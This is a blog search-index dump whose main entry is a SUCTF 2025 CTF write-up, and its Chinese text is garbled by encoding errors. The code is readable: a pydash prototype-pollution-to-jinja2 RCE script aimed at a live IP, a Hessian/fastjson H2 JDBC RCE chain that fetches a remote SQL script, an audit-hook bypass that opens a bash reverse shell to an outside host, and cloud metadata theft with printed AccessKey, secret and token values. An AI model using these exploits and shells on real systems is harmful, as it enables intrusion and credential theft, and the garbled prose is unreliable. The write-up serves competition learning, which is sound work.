äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ 